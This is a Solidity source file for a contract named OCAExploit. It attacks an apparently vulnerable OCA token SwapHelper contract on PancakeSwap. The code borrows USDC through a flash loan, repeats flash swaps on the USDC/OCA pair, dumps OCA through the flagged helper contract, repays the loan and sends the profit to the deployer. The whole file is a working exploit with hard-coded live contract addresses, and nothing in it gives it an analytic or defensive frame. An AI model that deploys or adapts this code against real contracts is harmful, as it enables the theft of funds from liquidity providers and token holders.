// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IPancakePair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IPancakeRouter {
    function getAmountsOut(uint256, address[] calldata) external view returns (uint256[] memory);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface ISwapHelper {
    function sellOCA(uint256 amount) external;
}

interface IMoolah {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

contract OCAExploit {
    address constant USDC   = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address constant OCA    = 0xE0dAFD4592205067299A6ae269f68aa804f95419;
    address constant PAIR   = 0x5779bf44CD518B05651AE38fCc066247cCe21504;  // PancakeSwap USDC/OCA
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;  // PancakeSwap V2
    address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;  // Flashloan provider
    address constant HELPER = 0xE0D5eC0F754c442F37fbdf18266053309D5F6f55;  // SwapHelper (vuln)

    uint256 private _usdcToPayPair;
    uint256 private _keepOca;
    address private _owner;

    constructor() {
        _owner = msg.sender;
    }

    function exploit() external {
        uint256 flashAmount = IERC20(USDC).balanceOf(MOOLAH);
        IERC20(USDC).approve(MOOLAH, flashAmount);
        IMoolah(MOOLAH).flashLoan(USDC, flashAmount, "");
        uint256 profit = IERC20(USDC).balanceOf(address(this));
        if (profit > 0) {
            IERC20(USDC).transfer(_owner, profit);
        }
    }

    function onMoolahFlashLoan(uint256 amount, bytes calldata) external {
        IERC20(OCA).approve(HELPER, type(uint256).max);

        address[] memory pathUsdcToOca = new address[](2);
        pathUsdcToOca[0] = USDC;
        pathUsdcToOca[1] = OCA;

        {
            uint256 curUsdc = IERC20(USDC).balanceOf(address(this));
            uint256[] memory amts = IPancakeRouter(ROUTER).getAmountsOut(curUsdc, pathUsdcToOca);
            _usdcToPayPair = curUsdc;
            IPancakePair(PAIR).swap(0, amts[1], address(this), abi.encode(uint256(1)));
            uint256 ocaBal = IERC20(OCA).balanceOf(address(this));
            _keepOca = ocaBal / 100;
            ISwapHelper(HELPER).sellOCA(ocaBal - _keepOca);
        }

        {
            uint256 curUsdc = IERC20(USDC).balanceOf(address(this));
            uint256[] memory amts = IPancakeRouter(ROUTER).getAmountsOut(curUsdc, pathUsdcToOca);
            _usdcToPayPair = curUsdc;
            IPancakePair(PAIR).swap(0, amts[1], address(this), abi.encode(uint256(1)));
            uint256 ocaBal = IERC20(OCA).balanceOf(address(this));
            ISwapHelper(HELPER).sellOCA(ocaBal - _keepOca);
        }

        {
            uint256 curUsdc = IERC20(USDC).balanceOf(address(this));
            uint256[] memory amts = IPancakeRouter(ROUTER).getAmountsOut(curUsdc, pathUsdcToOca);
            _usdcToPayPair = curUsdc;
            IPancakePair(PAIR).swap(0, amts[1], address(this), abi.encode(uint256(1)));
            uint256 ocaBal = IERC20(OCA).balanceOf(address(this));
            ISwapHelper(HELPER).sellOCA(ocaBal - _keepOca);
        }

        {
            uint256 remainingOca = IERC20(OCA).balanceOf(address(this));
            uint256 swapAmount = remainingOca - 1e15;
            IERC20(OCA).approve(ROUTER, swapAmount);
            address[] memory pathOcaToUsdc = new address[](2);
            pathOcaToUsdc[0] = OCA;
            pathOcaToUsdc[1] = USDC;
            IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                swapAmount, 0, pathOcaToUsdc, address(this), block.timestamp + 1000
            );
        }
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        IERC20(USDC).transfer(PAIR, _usdcToPayPair);
    }

    receive() external payable {}
}
